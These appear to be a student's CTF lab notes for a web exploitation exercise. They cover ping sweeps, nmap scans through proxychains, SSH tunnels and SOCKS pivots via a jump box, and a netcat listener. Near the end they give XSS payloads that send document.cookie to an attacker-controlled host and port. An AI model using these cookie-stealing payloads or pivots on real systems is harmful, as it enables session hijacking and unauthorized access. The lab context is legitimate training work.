>10.50.39.150
->T1:10.100.28.40
-> training website = 10.100.28.55
# get intial acces to the .40 before gaining access to the training website
------------------------------------------------------------------------------
# enum
```shell
for i in {1..254}; do (ping -c 1 10.100.28.$i | grep "bytes from" &); done | awk '{print $4}' | cut -d: -f1 > ips2.txt
#now create local file of ips(copy/paste)
proxychains nmap -iL ips.txt
#use to scan the ips you grabbed
proxychains nmap -iL ips.txt

#copy over ips file to your ops station ot proxy chains it
proxychains nmap 192.168.28.96/27 -Pn --script banner.nse
#
nmap -p 445 --script smb-os-discovery 192.168.28.5
#net cat
nc -lvknp #this will allow ocntinues connections to connectio
ssh student@10.50.39.150 -L 10300:192.168.28.120:4242
ssh student@localhost -p 10300 -D 9050
#YourTempPassword
/usr/share/namp/scripts$ : nmap 


Network: 192.168.28.96/27 97-126
Network:192.168.150.224/27 224.242

ssh student@10.50.39.150 -L 10300:10.100.28.40:4444
ssh student@localhost -p 10300 -D 9050
ssh student@localhost -p 10300 -L 10301:10.100.28.55:80

ssh student@10.50.39.150 -D 9050 -NT

#enumerate http
nmap 10.50.42.159 -Pn -p 80 --script http-enum.nse
nmap 10.50.42.159 -Pn -p 80 --script http-robots.txt.nse
#pull out all directories in browser 
#interact with buttons
Using Javascript to redirect information
<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
<script>window.location.href="http://website/?"+document.cookie;</script>
<script>write.location.href="http://10.50.20.97"</script>
```
# CTF info
T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.
```shell
#create local tunnel to jump box to scan intial web server
ssh student@10.50.39.150 -D 9050
#run python scan
#create ips list
# dump scans and enum

Training Website
We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.
The flag will be dumped when successful
ssh student@10.50.39.150 -D 9050 -NT

<script>document.location="http://10.50.34.63:2929/?username=" + document.cookie;</script>



